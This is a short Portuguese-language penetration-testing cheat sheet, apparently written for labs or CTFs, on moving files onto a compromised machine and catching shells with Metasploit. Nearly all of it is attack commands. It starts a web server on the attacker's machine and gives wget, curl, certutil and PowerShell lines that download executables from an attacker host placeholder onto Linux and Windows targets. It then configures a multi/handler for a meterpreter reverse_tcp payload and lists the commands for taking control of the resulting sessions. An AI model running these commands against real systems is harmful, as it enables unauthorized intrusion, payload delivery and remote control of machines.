# 📦 Transferência de Arquivos & Metasploit Handler

---

## 1. Subindo Servidores Web na Máquina Atacante

```bash
# Python 3 (Padrão)
python3 -m http.server 80

# Python 2
python -m SimpleHTTPServer 80

# PHP Web Server embutido
php -S 0.0.0.0:80
```

---

## 2. Baixando Arquivos no Alvo (Linux)

```bash
wget http://SEU_IP/arquivo -O /tmp/arquivo
curl http://SEU_IP/arquivo -o /tmp/arquivo
```

---

## 3. Baixando Arquivos no Alvo (Windows)

```cmd
:: Certutil (Nativo do Windows)
certutil -urlcache -f http://SEU_IP/arquivo.exe arquivo.exe
```

```powershell
# PowerShell - Invoke-WebRequest
powershell -c "Invoke-WebRequest -Uri http://SEU_IP/arquivo.exe -OutFile arquivo.exe"

# PowerShell - System.Net.WebClient
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://SEU_IP/arquivo.exe','arquivo.exe')"
```

---

## 4. Configurando o Multi Handler do Metasploit

Para receber conexões de payloads do `msfvenom` (Meterpreter ou Staged/Unstaged shells):

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST SEU_IP
set LPORT 4444
exploit -j        # Executa a escuta em background
```

### Gerenciamento de Sessões no Metasploit
```bash
sessions          # Lista todas as sessões ativas
sessions -i 1     # Interage com a sessão ID 1
```
